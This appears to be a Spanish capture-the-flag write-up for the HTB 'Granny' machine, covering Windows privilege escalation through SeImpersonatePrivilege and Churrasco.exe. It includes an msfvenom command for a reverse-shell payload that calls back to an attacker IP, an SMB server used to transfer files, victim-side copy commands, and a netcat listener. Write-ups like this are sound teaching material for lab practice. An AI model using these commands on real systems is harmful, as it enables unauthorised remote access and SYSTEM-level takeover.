#churrascoexe

----
# Requisitos:

Tiene que estar activado el *SeImpersonatePrivilege* que lo vamos a ver con [[whoami]] con el comando `whoami /all`


-----

Usamos [[whoami]] con el comando `whoami /all`

![[Granny10.png]]
Vemos que *SeImpersonatePrivilege* esta activado
Se podria hacer un JuicyPotato pero como es un windows muy viejo vamos a usar la version anterior que es la de [[Churrasco.exe]]
Descargamos el exploit desde este [repositorio](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS09-012/pr.exe)


### Con [[msfvenom]] vamos a crear el ejecutable *exploit.exe* para enviarnos una [[Reverse shell]]

```shell
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.15 LPORT=500 -f exe -o exploit.exe
```
![[Granny19.png]]



Desde nuestra maquina de atacante, donde tenemos el ejecutable del [[Churrasco.exe]] vamos a levantar un [[impacket-smbserver]] con el comando `impacket-smbserver smbfolder $(pwd) -smb2support`
![[Granny18.png]]

Vamos a crear una carpeta llamada */tmp* en *C:* para poder tener permisos de escritura sin ningun tipo de problemas
Y desde la maquina victima vamos a descargar los archivos con `copy \\10.10.16.15\smbfolder\exploit.exe .` y `copy \\10.10.16.15\smbfolder\churrasco.exe .`
![[Granny15.png]]

Ejecutamos el [[Churrasco.exe]] pasandole el *exploit.exe* que creamos para enviarnos una [[Reverse shell]] con [[msfvenom]]

![[Granny14.png]]
Mientras estamos en escucha con [[rlwrap nc -lvnp 443]] con el comando `rlwrap nc -nlvp 500` para enviarnos una [[Reverse shell]]
![[Granny12.png]]
Ya elevamos nuestro privilegio al maximo y podemos ver las flags